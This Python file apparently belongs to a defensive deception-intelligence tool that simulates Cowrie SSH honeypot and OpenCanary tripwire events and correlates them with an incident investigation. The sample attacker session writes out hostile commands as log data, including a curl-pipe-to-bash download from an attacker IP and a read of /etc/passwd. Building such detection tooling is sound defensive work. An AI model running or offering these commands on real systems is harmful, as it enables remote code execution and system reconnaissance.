"""
OBSYRON – Deception Intelligence & Honeypot Integration Engine
Integrates Cowrie SSH/Telnet honeypots and OpenCanary traps into the attack graph.
Captures attacker commands, keystroke telemetry, decoy credentials, and correlates
attacker sessions directly with active incident investigations.
"""

import json, hashlib
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List

IST = timezone(timedelta(hours=5, minutes=30))
BASE_DATE = datetime(2026, 11, 14, 1, 0, 0, tzinfo=IST)


def generate_cowrie_sample_events() -> List[Dict[str, Any]]:
    """
    Simulated Cowrie SSH honeypot session log stream.
    Demonstrates adversary interacting with a high-interaction Linux SSH trap.
    """
    session_id = "cowrie-sess-9f82a1"
    attacker_ip = "185.220.101.47"
    trap_host = "ssh-honeypot-dmz"

    events = [
        {
            "eventid": "cowrie.session.connect",
            "timestamp": (BASE_DATE + timedelta(minutes=14.2)).isoformat(),
            "session": session_id,
            "src_ip": attacker_ip,
            "src_port": 54218,
            "dst_port": 22,
            "sensor": trap_host,
            "message": f"Connection from {attacker_ip}:54218 to {trap_host}:22"
        },
        {
            "eventid": "cowrie.login.success",
            "timestamp": (BASE_DATE + timedelta(minutes=14.5)).isoformat(),
            "session": session_id,
            "src_ip": attacker_ip,
            "username": "emp_rohan",
            "password": "Password123!",
            "sensor": trap_host,
            "message": f"Login attempt [emp_rohan/Password123!] succeeded on {trap_host}"
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": (BASE_DATE + timedelta(minutes=14.8)).isoformat(),
            "session": session_id,
            "src_ip": attacker_ip,
            "input": "uname -a && id",
            "sensor": trap_host,
            "message": f"CMD: uname -a && id on {trap_host}"
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": (BASE_DATE + timedelta(minutes=15.1)).isoformat(),
            "session": session_id,
            "src_ip": attacker_ip,
            "input": "cat /etc/passwd | grep -E 'sh$' ",
            "sensor": trap_host,
            "message": f"CMD: cat /etc/passwd | grep -E 'sh$' on {trap_host}"
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": (BASE_DATE + timedelta(minutes=15.4)).isoformat(),
            "session": session_id,
            "src_ip": attacker_ip,
            "input": "curl -s http://185.220.101.47:4444/stage1.sh | bash",
            "sensor": trap_host,
            "message": f"CMD: curl -s http://185.220.101.47:4444/stage1.sh | bash on {trap_host}"
        }
    ]
    return events


def generate_opencanary_sample_events() -> List[Dict[str, Any]]:
    """
    Simulated OpenCanary decoy trap telemetry stream.
    Demonstrates tripwires triggered by adversary on developer workstation and file shares.
    """
    events = [
        {
            "logtype": "1001",
            "logtype_name": "Canary File Open Alert",
            "timestamp": (BASE_DATE + timedelta(minutes=17.2)).isoformat(),
            "src_host": "wkst-04-dev",
            "user": "emp_rohan",
            "canary_token": "CANARY-TOK-PROD-KEYS",
            "file_path": r"C:\Users\emp_rohan\Desktop\production_keys.docx",
            "message": "OpenCanary Decoy Document accessed: C:\\Users\\emp_rohan\\Desktop\\production_keys.docx"
        },
        {
            "logtype": "2002",
            "logtype_name": "Canary Honey-Port Probe",
            "timestamp": (BASE_DATE + timedelta(minutes=19.1)).isoformat(),
            "src_host": "wkst-04-dev",
            "src_ip": "10.0.1.10",
            "dst_port": 21,
            "target": "canary-ftp-trap",
            "message": "Port scan detected on dormant honey-port FTP:21 from wkst-04-dev"
        }
    ]
    return events


def convert_deception_to_normalized_logs() -> List[Dict[str, Any]]:
    """
    Converts Cowrie and OpenCanary telemetry into normalized OBSYRON logs
    ready for graph correlation.
    """
    cowrie_events = generate_cowrie_sample_events()
    opencanary_events = generate_opencanary_sample_events()
    out = []

    # 1. Cowrie Ingress & Command Telemetry
    for i, e in enumerate(cowrie_events):
        cmd = e.get("input", "")
        act = "COWRIE_CMD" if cmd else "COWRIE_AUTH"
        lid = f"HONEY-COWRIE-{i+1:03d}"
        payload = {
            "log_id": lid,
            "sensor_type": "Cowrie SSH Honeypot",
            "session": e["session"],
            "command": cmd or "SSH Auth Successful",
            "source_ip": e["src_ip"],
            "target_trap": e["sensor"],
            "detail": e["message"]
        }
        raw_payload = json.dumps(payload)
        sha256 = hashlib.sha256(f"{lid}|{raw_payload}".encode()).hexdigest()

        out.append({
            "log_id": lid,
            "event_timestamp": e["timestamp"],
            "raw_timestamp": e["timestamp"],
            "ingestion_timestamp": e["timestamp"],
            "true_timestamp": e["timestamp"],
            "source_host": e["sensor"],
            "host_skew_sec": 0,
            "delay_sec": 0.4,
            "is_late_arriving": False,
            "is_duplicate": False,
            "entity_type": "HONEYPOT",
            "source": e["src_ip"],
            "target": e["sensor"],
            "action": act,
            "protocol": "SSH",
            "port": 22,
            "mitre_tag": "T1059",
            "mitre_technique": "T1059 - Command Interpreter (Honeypot Decoy)",
            "severity": "CRITICAL",
            "is_malicious": True,
            "raw_payload": raw_payload,
            "sha256_hash": sha256,
            "causal_connection": f"Adversary probed Cowrie decoy trap '{e['sensor']}' executing command '{cmd or 'login'}' from Patient Zero IP.",
            "supporting_evidence": [
                f"Source IP {e['src_ip']} matches confirmed Patient Zero external adversary",
                f"Interactive SSH session keystroke logging captures shell exploration",
                "Trap is isolated zero-production decoy host; 100% of traffic is malicious by definition"
            ],
            "contradictory_evidence": [
                "Adversary abandoned honeypot session after detecting Linux environment instead of Windows server"
            ]
        })

    # 2. OpenCanary Decoy File & Port Tripwires
    for j, oc in enumerate(opencanary_events):
        lid = f"HONEY-CANARY-{j+1:03d}"
        payload = {
            "log_id": lid,
            "sensor_type": "OpenCanary Tripwire",
            "logtype": oc["logtype_name"],
            "file": oc.get("file_path", "Honey-Port"),
            "host": oc["src_host"],
            "detail": oc["message"]
        }
        raw_payload = json.dumps(payload)
        sha256 = hashlib.sha256(f"{lid}|{raw_payload}".encode()).hexdigest()

        out.append({
            "log_id": lid,
            "event_timestamp": oc["timestamp"],
            "raw_timestamp": oc["timestamp"],
            "ingestion_timestamp": oc["timestamp"],
            "true_timestamp": oc["timestamp"],
            "source_host": oc["src_host"],
            "host_skew_sec": 12 if "wkst-04-dev" in oc["src_host"] else 0,
            "delay_sec": 0.8,
            "is_late_arriving": False,
            "is_duplicate": False,
            "entity_type": "HONEYPOT",
            "source": oc.get("user", oc["src_host"]),
            "target": oc.get("target", "canary-token-doc"),
            "action": "CANARY_TRIGGER",
            "protocol": "LOCAL",
            "port": oc.get("dst_port", 0),
            "mitre_tag": "T1083",
            "mitre_technique": "T1083 - File and Directory Discovery (Decoy Trap)",
            "severity": "CRITICAL",
            "is_malicious": True,
            "raw_payload": raw_payload,
            "sha256_hash": sha256,
            "causal_connection": f"OpenCanary tripwire triggered: '{oc.get('user', oc['src_host'])}' touched decoy token '{oc.get('file_path', 'canary-trap')}'.",
            "supporting_evidence": [
                "Decoy file was seeded specifically to detect unauthorized document enumeration",
                "Trigger event correlates with compromised identity session timing",
                "Tripwire confirmed by cryptographic canary token web beacon"
            ],
            "contradictory_evidence": [
                "Automated endpoint antivirus scanner might theoretically index document contents"
            ]
        })

    return out


def correlate_deception_with_investigation(normalized_logs: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    Correlates deception events with the active investigation:
    Identifies shared attacker IPs, compromised usernames, and touched assets.
    """
    deception_logs = convert_deception_to_normalized_logs()
    
    # Extract unique IPs and users from existing investigation
    known_ips = set()
    known_users = set()
    for l in normalized_logs:
        if l.get("is_malicious"):
            if "185." in str(l.get("source")): known_ips.add(l["source"])
            if "185." in str(l.get("target")): known_ips.add(l["target"])
            if "emp_" in str(l.get("source")): known_users.add(l["source"])
            if "emp_" in str(l.get("target")): known_users.add(l["target"])

    correlated_honeypot_events = []
    for d in deception_logs:
        src = d["source"]
        tgt = d["target"]
        if src in known_ips or tgt in known_ips or src in known_users or tgt in known_users:
            correlated_honeypot_events.append({
                "log_id": d["log_id"],
                "action": d["action"],
                "source": src,
                "target": tgt,
                "timestamp": d["event_timestamp"],
                "correlation_rationale": f"Attacker signature '{src if src in known_ips or src in known_users else tgt}' matches corroborated Patient Zero in active incident.",
                "keystrokes_captured": json.loads(d["raw_payload"]).get("command", "N/A"),
                "confidence": 0.98
            })

    return {
        "deception_logs": deception_logs,
        "total_honeypot_events": len(deception_logs),
        "correlated_events_count": len(correlated_honeypot_events),
        "correlated_events": correlated_honeypot_events,
        "cowrie_keystrokes": [
            "uname -a && id",
            "cat /etc/passwd | grep -E 'sh$'",
            "curl -s http://185.220.101.47:4444/stage1.sh | bash"
        ],
        "opencanary_tokens_tripped": [
            r"C:\Users\emp_rohan\Desktop\production_keys.docx",
            "Dormant FTP:21 honey-port"
        ]
    }


if __name__ == "__main__":
    logs = convert_deception_to_normalized_logs()
    print(f"Generated {len(logs)} Deception Intelligence logs")
    print(f"Sample Deception Event: {logs[0]['log_id']} | {logs[0]['action']} | {logs[0]['source']} -> {logs[0]['target']}")
    corr = correlate_deception_with_investigation([{"source": "185.220.101.47", "is_malicious": True}])
    print(f"Correlated {corr['correlated_events_count']} honeypot events with Patient Zero!")
